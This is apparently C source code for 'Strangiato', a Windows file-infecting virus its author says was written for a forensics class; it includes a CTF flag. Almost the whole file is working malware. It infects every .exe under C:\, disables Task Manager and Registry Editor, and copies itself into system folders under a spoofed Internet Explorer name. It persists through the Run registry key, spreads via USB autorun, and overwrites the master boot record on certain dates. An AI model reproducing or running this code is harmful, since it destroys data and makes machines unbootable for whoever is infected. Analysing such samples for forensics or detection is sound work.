//                The Strangiato virus
//                Virus.Win32.Strangiato
//   
//     This was a proof-of-concept virus written for my
//     COMP-3-247 - Advanced Investigations class.
//
//     We had to create a form of malware to analyze
//     using Volatility, though we could have easily
//     used something like Metasploit to generate a
//     trojan. Since I like to make things hard on 
//     myself, and I haven't made any malware in a hot
//     minute, I decided to create this, a PE file infector
//     armed with various dangerous payloads
//
//     Though I had originally intended for infected
//     files to work after being infected, I was on a
//     serious time limit (because it's school) and as a
//     result, there's an increased chance that files will
//     be inoperable after being infected. It doesn't matter
//     that much for me because it still achieves what I wanted it
//     to do in the first place. It propogates the drive that it
//     is currently resident on and infects everything in its
//     criteria. On a few given dates, it will execute its payloads
//     which can range from simple unclosable message box spamming
//     to a complete overwrite of the master boot record. Best of all
//     there is typically little to no detection from Win Defender
//
//     I might go back and fix this at a later date, but as of now,
//     it is still in a state in which it is still extremely malicious
//     so who knows?
//
//     NOTE: All debug messages do not appear under a regular compilation
//     of the virus
//----------------------------------------------------------------------

#include <stdio.h>
#include <windows.h>
#include <shlobj.h>  // For SHGetFolderPath
#include <winreg.h>  // For registry manipulation
#include <shellapi.h> // For ShellExecuteEx
#include <string.h>
#include <process.h>
#include <stdlib.h>

#define VIRUS_SIZE 155648  // The size of the virus (152 KB) -- DO NOT CHANGE
#define KEYWORD_COUNT 3  // Amount of keywords in the array


// In case this program is used for a CTF event, here's the flag
const char *flag = "flag{the_answ3r_r3ma1ns_1ns1d3}";


unsigned char virusCode[] = { };        // Meant to contain the entirety of the virus code so it can be placed in infected files

void InfectFile(const char *filename);
void TraverseDirectories(const char *directory);
void CopyToSystemDirectories();
void AddToStartup();
void RunHostCode();
void ElevatePrivileges();
int IsRunningAsAdmin();
int isEighteenth();
void overwriteMBR();
void SpreadToUSB();
int detectKeywords(const char *filename);


//Similar to the Magistrate worm, I wanted to make a function that will scan for instances
//of malware terms within files and infect them directly. I opted out of this approach since
//it really limits the propogation of the virus.


const char *keywords[KEYWORD_COUNT] = {"malware", "virus", "trojan"};


// Small function to get the date of the system.
// This is for the September 29th payload
// It simply checks the date and returns the output

int isSeptember29() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    return (st.wMonth == 9 && st.wDay == 29);
}


// Of course we disable Task Manager so that 
// virus removal is more difficult

void DisableTaskManager() {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS) {
        DWORD dwValue = 1; 
        if (RegSetValueEx(hKey, "DisableTaskMgr", 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue)) == ERROR_SUCCESS) {
            printf("Task Manager has been disabled.\n");    //Debug message
        }
        RegCloseKey(hKey);
    }
}


void DisableRegistryEditor() {
    HKEY hKey;                      //Prevents created registry keys from being removed easily
    DWORD dwDisposition;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition) == ERROR_SUCCESS) {
        DWORD dwValue = 1; 
        if (RegSetValueEx(hKey, "DisableRegistryTools", 0, REG_DWORD, (const BYTE*)&dwValue, sizeof(dwValue)) == ERROR_SUCCESS) {
            printf("Registry Editor has been disabled.\n");  //Debug message
        }
        RegCloseKey(hKey);
    }
}


// Function to spam random message boxes
// Used for one of the payloads

void spamMessageBoxes() {
    const char *messages[] = {
        "Why do they always send the poor?",            // Mesmerize = Album of the Year 2005
        "Where the fuck are you?",
        "Why don't presidents fight the war?",
    };

    while (1) {
        for (int i = 0; i < sizeof(messages) / sizeof(messages[0]); i++) {
            MessageBox(NULL, messages[i], "Strangiato!", MB_OK | MB_ICONINFORMATION);
            Sleep(100); //This can be changed, though it doesn't really affect much
        }
    }
}


// Only included because Strangiato has difficulty infecting specific files
// Note: the virus cannot infect system-critical files, as they are write protected by Microsoft
// but other files like .NET binaries and such can be infected
// I wouldn't have included this if I intended for the virus to spread in the wild since it spawns
// the UAC window. It is possible to disguise this file so that the UAC is acceptable however.

void EnableDebugPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tokenPrivileges;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {    // Get the access token associated with the current process

        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            tokenPrivileges.PrivilegeCount = 1;
            tokenPrivileges.Privileges[0].Luid = luid;                                  // Get the LUID for the privilege
            tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);       // And adjust the permissions

            if (GetLastError() == ERROR_SUCCESS) {                                  // This should work if Admin privileges have been granted
                printf("SE_DEBUG_NAME privilege enabled successfully.\n");
            } else {
                printf("Failed to enable SE_DEBUG_NAME privilege.\n");
            }
        } else {
            printf("LookupPrivilegeValue failed.\n");
        }

        CloseHandle(hToken);
    } else {
        printf("OpenProcessToken failed.\n");
    }
}


// Check if the day is the 18th of any month
// If it matches this date, the MBR overwrite occurs

int isEighteenth() {
    SYSTEMTIME st;
    GetLocalTime(&st);              // Grab current time
    return (st.wDay == 18);             // Compare
}


// Function to scan a file for keywords
// This function goes unused (just garbage data)

int detectKeywords(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        printf("Error opening file: %s\n", filename);
        return 0;
    }

    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), file)) {
        for (int i = 0; i < KEYWORD_COUNT; i++) {
            if (strstr(buffer, keywords[i])) {
                fclose(file);
                return 1;  // Keyword found
            }
        }
    }

    fclose(file);
    return 0;  // No keywords found
}


// Function to overwrite the MBR
// This performs a traditional overwrite seen in various
// other files
void overwriteMBR() {
    HANDLE hDevice = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        DWORD dwError = GetLastError();                                             // In case we can't do it
        printf("Failed to open PhysicalDrive0. Error code: %lu\n", dwError);
        MessageBox(NULL, "Failed to open drive", "Error", MB_OK | MB_ICONERROR);
        return;
    }

    DWORD bytesWritten;
    char mbrData[512] = {0};
    snprintf(mbrData, sizeof(mbrData), "The Strangiato has cut your computer down");

    WriteFile(hDevice, mbrData, 512, &bytesWritten, NULL);
    CloseHandle(hDevice);

}


// This function obtains information on all available drives on the device and sends a copy of the virus
// to those that are removable (USB, floppy, etc.)

void SpreadToUSB() {
    char driveLetters[256];
    DWORD driveMask = GetLogicalDrives();               // Obtain all drives
    
    if (driveMask == 0) {
        printf("Failed to get logical drives.\n");
        return;
    }
    
    for (int i = 0; i < 26; i++) {
        if (driveMask & (1 << i)) {
            char driveName[4] = { 'A' + i, ':', '\\', '\0' };
            
            // Check if the drive is a removable drive
            if (GetDriveType(driveName) == DRIVE_REMOVABLE) {
                printf("Detected removable drive: %s\n", driveName);

                // Copy the virus executable to the USB drive
                char targetPath[MAX_PATH];
                snprintf(targetPath, MAX_PATH, "%s%s", driveName, "Strangiato.exe");

                if (CopyFile("Strangiato.exe", targetPath, FALSE)) {
                    printf("Copied to %s\n", targetPath);

                    // Create autorun.inf
                    char autorunPath[MAX_PATH];
                    snprintf(autorunPath, MAX_PATH, "%s%s", driveName, "autorun.inf");
                    FILE *autorunFile = fopen(autorunPath, "w");
                    if (autorunFile) {
                        fprintf(autorunFile,
                                "[Autorun]\n"
                                "Open=Strangiato.exe\n"
                                "Action=Run Strangiato Virus\n"
                                "Label=Strangiato\n");
                        fclose(autorunFile);
                        printf("Created autorun.inf\n");

                    } else {
                        printf("Failed to create autorun.inf\n");
                    }

                } else {
                    printf("Failed to copy to %s\n", targetPath);
                }
            }
        }
    }
}


// Function to elevate privileges

void ElevatePrivileges() {
    char filePath[MAX_PATH];
    GetModuleFileName(NULL, filePath, MAX_PATH);

    SHELLEXECUTEINFO shExecInfo = {0};
    shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    shExecInfo.fMask = SEE_MASK_DEFAULT;
    shExecInfo.hwnd = NULL;
    shExecInfo.lpVerb = "runas";  // Elevation verb
    shExecInfo.lpFile = filePath;
    shExecInfo.lpParameters = ""; // No extra parameters
    shExecInfo.lpDirectory = NULL;
    shExecInfo.nShow = SW_SHOWNORMAL;

    //Garbage/unsued stuff

/*    if (!ShellExecuteEx(&shExecInfo)) {
        MessageBox(NULL, "Failed to elevate privileges.", "Error", MB_OK | MB_ICONERROR);       //Debugging message
    }
        */
}



// Function to check if running as admin

int IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;

    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,              // It is done by gaining access to the current SID of the user
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
        FreeSid(administratorsGroup);
    }

    return isAdmin;
}


// The main function

int main(int argc, char *argv[]) {

    // Check if the program is running as administrator

    EnableDebugPrivilege();
    if (!IsRunningAsAdmin()) {
        ElevatePrivileges();
        return 0; // Exit the current process; elevated version will continue
    }
	

    DisableTaskManager();
    DisableRegistryEditor();
    

    // Start scanning from the root of the C: drive downward
    TraverseDirectories("C:\\");

    // Copy the malware to system directories and add it to startup
    CopyToSystemDirectories();
    AddToStartup();

    if (isEighteenth()) {
        overwriteMBR();
    } else {
        MessageBox(NULL, "Never turn your back on a monster!", "Strangiato", MB_OK | MB_ICONEXCLAMATION);
    }

    if (isSeptember29()) {
        MessageBox(NULL, "It's party time! And we don't live in a fascist nation! It's party time, and where the FUCK are you?", "BLAST OFF!", MB_OK | MB_ICONEXCLAMATION);
        
        // Start a thread to spam message boxes
        _beginthread((void(*)(void*))spamMessageBoxes, 0, NULL);
    }
    
    SpreadToUSB();
    
    // Run original host code after infection
    // This will be fixed in the future, though the virus still succeeds in infection
    RunHostCode();

    return 0;
}


// Directory traversal to infect files
// This function searches for all .exe files in a directory and can access subdirectories if any are discovered

void TraverseDirectories(const char *directory) {
    WIN32_FIND_DATA fileData;
    char searchPath[MAX_PATH];
    snprintf(searchPath, sizeof(searchPath), "%s\\*.*", directory);         // Look for files in the selected path

    HANDLE hFind = FindFirstFile(searchPath, &fileData);                    // Using FindFirstFile to do so

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (strcmp(fileData.cFileName, ".") != 0 && strcmp(fileData.cFileName, "..") != 0) {        // Is it a subdirectory or the currently opened directory?
            char filePath[MAX_PATH];
            snprintf(filePath, sizeof(filePath), "%s\\%s", directory, fileData.cFileName);

            if (fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                TraverseDirectories(filePath);
            } else if (strstr(fileData.cFileName, ".exe")) {        // Is there any exe files?
                InfectFile(filePath);                                 // Yes, then infect them
            }
        }
    } while (FindNextFile(hFind, &fileData) != 0);                  // Find every exe file until there are none left to infect

    FindClose(hFind);
}


// Perhaps the most complicated function
// This is where files are infected

void InfectFile(const char *filename) {
    FILE *hostFile = fopen(filename, "r+b");            // In case we don't have the right attributes
    if (!hostFile) {
        printf("Error opening file: %s\n", filename);
        return;
    }

    // Read PE headers
    fseek(hostFile, 0, SEEK_SET);
    fseek(hostFile, 60, SEEK_SET);                      // The location of the PE header
    DWORD peHeaderOffset;
    fread(&peHeaderOffset, sizeof(DWORD), 1, hostFile);
    
    // Move to the NT headers
    fseek(hostFile, peHeaderOffset, SEEK_SET);
    IMAGE_NT_HEADERS ntHeaders;
    fread(&ntHeaders, sizeof(IMAGE_NT_HEADERS), 1, hostFile);
    
    // Calculate the original entry point
    DWORD originalEntryPoint = ntHeaders.OptionalHeader.AddressOfEntryPoint;

    // Move to the end of the file to append the virus code
    fseek(hostFile, 0, SEEK_END);
    long virusStartOffset = ftell(hostFile);
    
    // Append the virus code
    fwrite(virusCode, sizeof(char), VIRUS_SIZE, hostFile);

    // Prepare jump instruction to original entry point
    // Assuming originalEntryPoint is correct relative to the start of the PE
    DWORD jumpOffset = (DWORD)(virusStartOffset - (ftell(hostFile) - sizeof(DWORD))) - 5; // Subtract 5 for jump size

    // Write jump instruction to the original entry point
    unsigned char jumpInstruction[5];
    jumpInstruction[0] = 0xE9; // JMP instruction
    *((DWORD *)(jumpInstruction + 1)) = jumpOffset; // Relative address

    // Move to original entry point to write the jump instruction
    fseek(hostFile, originalEntryPoint, SEEK_SET);
    fwrite(jumpInstruction, sizeof(jumpInstruction), 1, hostFile);

    fclose(hostFile);
}


// Here when running the host code (the original executable)
// This needs a shitton of improvement

void RunHostCode() {
    char filePath[MAX_PATH];
    GetModuleFileName(NULL, filePath, MAX_PATH); // Get the current executable path

    // Run the host executable (this instance of the virus) using ShellExecuteEx
    SHELLEXECUTEINFO shExecInfo = {0};
    shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    shExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shExecInfo.hwnd = NULL;
    shExecInfo.lpVerb = "open";
    shExecInfo.lpFile = filePath; // Use the dynamic path here
    shExecInfo.nShow = SW_SHOWNORMAL;

    if (ShellExecuteEx(&shExecInfo)) {
        WaitForSingleObject(shExecInfo.hProcess, INFINITE);
        CloseHandle(shExecInfo.hProcess);
    }
}


void CopyToSystemDirectories() {
    char srcPath[MAX_PATH];
    char winPath[MAX_PATH];
    char programFilesPath[MAX_PATH];

    GetModuleFileName(NULL, srcPath, MAX_PATH);

    GetWindowsDirectory(winPath, MAX_PATH);
    snprintf(winPath, MAX_PATH, "%s\\iexplorerr.exe", winPath);             //Copy to C:\Windows as iexplorrer.exe

    SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, 0, programFilesPath);
    snprintf(programFilesPath, MAX_PATH, "%s\\iexplorerr.exe", programFilesPath);

    if (CopyFile(srcPath, winPath, FALSE)) {
        printf("Copied to Windows directory: %s\n", winPath);       //Debug message
    } else {
        printf("Failed to copy to Windows directory.\n");           //Debug message
    }

    if (CopyFile(srcPath, programFilesPath, FALSE)) {
        printf("Copied to Program Files directory: %s\n", programFilesPath);    //Debug message
    } else {
        printf("Failed to copy to Program Files directory.\n");         //Debug message
    }
}


void AddToStartup() {
    HKEY hKey;
    const char *malwareName = "iexplorerr";
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    // Open the registry key for the current user's startup entries
    if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, malwareName, 0, REG_SZ, (const BYTE *)exePath, strlen(exePath) + 1);
        RegCloseKey(hKey);
        printf("Added to startup: %s\n", malwareName);
    } else {
        printf("Failed to open registry key for startup.\n");
    }
}

// THATS A TECHNICAL FOUL!!!